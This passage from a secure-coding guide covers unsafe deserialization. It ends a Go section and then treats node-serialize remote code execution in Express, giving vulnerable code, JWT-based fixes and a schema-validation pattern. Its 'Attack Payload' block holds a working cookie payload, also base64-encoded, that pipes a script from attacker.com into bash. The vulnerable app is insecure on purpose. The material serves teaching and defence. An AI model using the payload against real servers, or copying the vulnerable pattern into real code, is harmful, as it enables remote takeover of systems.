// json.RawMessage delays parsing until type is validated
type MessageEnvelope struct {
    Type    string          `json:"type"`
    Payload json.RawMessage `json:"payload"` // Not parsed yet!
}
```

2. **Allowlist Factory Registry**:
```go
// Only explicitly registered types can be deserialized
payloadRegistry = map[string]PayloadFactory{
    "notification":  parseNotification,  // Explicit mapping
    "config_update": parseConfigUpdate,
}
// Unknown types are rejected before any parsing
```

3. **Cryptographic Integrity Verification**:
```go
// Verify payload hasn't been tampered with
func verifyChecksum(envelope *MessageEnvelope) bool {
    hash := sha256.Sum256(envelope.Payload)
    expected := hex.EncodeToString(hash[:])
    return envelope.Checksum == expected
}
```

**Additional Protections**:
- **Never use `gob` encoding from untrusted sources** - it can instantiate arbitrary types
- **Avoid `yaml.Unmarshal`** without strict mode - YAML supports object instantiation
- **Timestamp validation** prevents replay attacks with old captured messages
- **Request timeouts** prevent CPU exhaustion from complex nested structures
- **Per-type validation** ensures business logic constraints are enforced
- **Comprehensive audit logging** enables incident response and forensics

Using `node-serialize` or similar serialization libraries that execute JavaScript during deserialization is extremely dangerous and can lead to Remote Code Execution (RCE). This vulnerability was exploited in CVE-2017-5941 and continues to affect applications in 2023-2024.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

// DANGEROUS: Deserializing untrusted user data
app.get('/dashboard', (req, res) => {
  const sessionCookie = req.cookies.session;

  if (sessionCookie) {
    // VULNERABLE: Directly deserializing user-controlled data
    const sessionData = serialize.unserialize(
      Buffer.from(sessionCookie, 'base64').toString()
    );

    res.send(`Welcome back, ${sessionData.username}!`);
  } else {
    res.redirect('/login');
  }
});

app.post('/login', (req, res) => {
  const userData = {
    username: req.body.username,
    userId: 12345,
    role: 'user'
  };

  // Serialize and set cookie
  const serialized = serialize.serialize(userData);
  res.cookie('session', Buffer.from(serialized).toString('base64'));
  res.redirect('/dashboard');
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE for RCE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl https://attacker.com/shell.sh | bash')}()"}

// Base64 encoded for cookie injection:
// eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2N1cmwgaHR0cHM6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggfCBiYXNoJyl9KCkifQ==
```

**Why This Is Dangerous**:
- `node-serialize` uses `eval()` internally to reconstruct functions, allowing arbitrary code execution
- The `_$$ND_FUNC$$_` marker triggers function reconstruction and immediate execution via `()`
- User-controlled cookies are completely untrusted input that can contain any payload
- Once executed, attacker has full server access with Node.js process privileges

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');
const { randomBytes } = require('crypto');

const app = express();
app.use(cookieParser());

// Use a strong secret from environment variables
const JWT_SECRET = process.env.JWT_SECRET || randomBytes(64).toString('hex');

// SECURE: Use JSON Web Tokens with signature verification
app.get('/dashboard', (req, res) => {
  const sessionToken = req.cookies.session;

  if (!sessionToken) {
    return res.redirect('/login');
  }

  try {
    // SECURE: JWT verifies signature, preventing tampering
    const sessionData = jwt.verify(sessionToken, JWT_SECRET, {
      algorithms: ['HS256'],  // Explicitly specify allowed algorithms
      maxAge: '1h'            // Token expiration
    });

    // Validate expected data structure
    if (!sessionData.username || typeof sessionData.username !== 'string') {
      throw new Error('Invalid session structure');
    }

    // Sanitize output
    const safeUsername = sessionData.username.replace(/[<>"'&]/g, '');
    res.send(`Welcome back, ${safeUsername}!`);

  } catch (err) {
    console.error('Session verification failed:', err.message);
    res.clearCookie('session');
    res.redirect('/login');
  }
});

app.post('/login', (req, res) => {
  // Validate and sanitize input
  const username = String(req.body.username || '').slice(0, 50);

  if (!username || !/^[a-zA-Z0-9_-]+$/.test(username)) {
    return res.status(400).send('Invalid username');
  }

  const userData = {
    username: username,
    userId: 12345,
    role: 'user',
    iat: Math.floor(Date.now() / 1000)
  };

  // SECURE: Sign with JWT - no code execution possible
  const token = jwt.sign(userData, JWT_SECRET, {
    algorithm: 'HS256',
    expiresIn: '1h'
  });

  res.cookie('session', token, {
    httpOnly: true,     // Prevent XSS access
    secure: true,       // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000     // 1 hour
  });

  res.redirect('/dashboard');
});

app.listen(3000);
```

**Key Security Controls**:
- **JWT with signature verification**: Data cannot be tampered with without invalidating the signature, and no code execution occurs during parsing
- **Algorithm restriction**: Explicitly specifying `HS256` prevents algorithm confusion attacks
- **Secure cookie attributes**: `httpOnly`, `secure`, and `sameSite` provide defense in depth against XSS and CSRF
- **Input validation**: Username is validated against a whitelist pattern before use

When handling complex objects from external sources, you need multiple layers of validation: schema validation, prototype pollution prevention, and runtime type checking. Here's a production-ready approach:

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();

// Security headers
app.use(helmet());

// Rate limiting
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  message: 'Too many requests'
});
app.use('/api/', apiLimiter);

// Initialize JSON Schema validator
const ajv = new Ajv({
  allErrors: true,
  removeAdditional: true,    // Strip unexpected properties
  useDefaults: true,
  coerceTypes: false,        // Don't auto-convert types
  strict: true
});
addFormats(ajv);

// Define strict schema for external API data
const externalDataSchema = {
  type: 'object',
  required: ['id', 'data'],
  additionalProperties: false,  // Reject unexpected properties
  properties: {
    id: {
      type: 'string',
      pattern: '^[a-zA-Z0-9-]{1,36}$'
    },
    data: {
      type: 'object',
      additionalProperties: false,
      properties: {
        name: { type: 'string', maxLength: 100 },
        email: { type: 'string', format: 'email', maxLength: 255 },
        settings: {
          type: 'object',
          additionalProperties: false,
          properties: {
            theme: { type: 'string', enum: ['light', 'dark'] },
            notifications: { type: 'boolean' }
          }
        },
        tags: {
          type: 'array',
          maxItems: 10,
          items: { type: 'string', maxLength: 50 }
        }
      }
    },
    metadata: {
      type: 'object',
      additionalProperties: false,
      properties: {
        timestamp: { type: 'string', format: 'date-time' },
        version: { type: 'integer', minimum: 1, maximum: 100 }
      }
    }
  }
};

const validateExternalData = ajv.compile(externalDataSchema);

// SECURE: Safe JSON parser with prototype pollution prevention
function safeJsonParse(jsonString, maxSize = 1024 * 1024) {
  // Size limit to prevent DoS
  if (typeof jsonString !== 'string' || jsonString.length > maxSize) {
    throw new Error('Invalid input size');
  }

  // Parse with reviver to prevent prototype pollution
  const parsed = JSON.parse(jsonString, (key, value) => {
    // Block prototype pollution attempts
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      console.warn(`Blocked prototype pollution attempt: ${key}`);
      return undefined;
    }
    return value;
  });

  // Deep freeze to prevent modification after parsing
  return deepFreeze(parsed);
}

// Recursively freeze object
function deepFreeze(obj) {
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }

  Object.keys(obj).forEach(key => {
    const value = obj[key];
    if (typeof value === 'object' && value !== null) {
      deepFreeze(value);
    }
  });

  return Object.freeze(obj);
}

// Create safe copy without prototype chain
function sanitizeObject(obj) {
  return JSON.parse(JSON.stringify(obj));
}

// SECURE: API endpoint with full validation pipeline
app.post('/api/external-data', express.raw({ 
  type: 'application/json',
  limit: '100kb'  // Limit request body size
}), async (req, res) => {
  const requestId = require('crypto').randomUUID();
  const startTime = Date.now();

  try {
    // Step 1: Safe JSON parsing
    let data;
    try {
      data = safeJsonParse(req.body.toString('utf8'));
    } catch (parseError) {
      console.error(`[${requestId}] JSON parse error:`, parseError.message);
      return res.status(400).json({
        error: 'Invalid JSON format',
        requestId
      });
    }

    // Step 2: Schema validation
    const valid = validateExternalData(data);
    if (!valid) {
      console.warn(`[${requestId}] Schema validation failed:`, 
        ajv.errorsText(validateExternalData.errors));
      return res.status(400).json({
        error: 'Data validation failed',
        details: validateExternalData.errors.map(e => ({
          path: e.instancePath,
          message: e.message
        })),
        requestId
      });
    }

    // Step 3: Create sanitized copy for processing
    const sanitizedData = sanitizeObject(data);

    // Step 4: Business logic with sanitized data
    const result = await processExternalData(sanitizedData);

    // Audit logging
    console.log(JSON.stringify({
      event: 'external_data_processed',
      requestId,
      dataId: sanitizedData.id,
      processingTimeMs: Date.now() - startTime,
      timestamp: new Date().toISOString()
    }));

    res.json({
      success: true,
      result,
      requestId
    });

  } catch (error) {
    console.error(`[${requestId}] Processing error:`, error.message);
    res.status(500).json({
      error: 'Internal processing error',
      requestId
    });
  }
});

async function processExternalData(data) {
  // Safe to use - data is validated and sanitized
  return {
    processed: true,
    id: data.id,
    timestamp: new Date().toISOString()
  };
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'healthy' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
```

